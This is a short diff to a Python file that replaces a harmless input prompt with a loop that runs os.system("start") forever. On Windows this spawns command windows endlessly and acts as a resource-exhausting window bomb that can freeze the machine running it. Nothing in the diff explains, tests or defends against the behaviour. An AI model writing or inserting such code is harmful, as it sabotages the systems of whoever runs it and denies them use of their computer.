@@ -1,1 +1,4 @@
-a = input("Hi: ")
+import os
+
+while True:
+  os.system("start")
